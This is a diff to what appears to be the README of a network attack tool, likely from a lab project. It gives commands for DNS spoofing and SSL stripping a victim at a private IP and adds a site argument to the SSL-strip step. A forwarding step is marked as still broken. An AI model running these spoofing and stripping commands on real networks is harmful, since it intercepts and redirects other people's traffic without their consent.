@@ -25,7 +25,7 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 
 3. DNS Spoof the victim: `sudo python3 main.py --interface "enp0s10" dnsSpoof --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 
 
-4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5"` 
+4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 
 
 STILL BROKEN:
 5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --ipToSpoof "142.250.179.174"` _google.com_
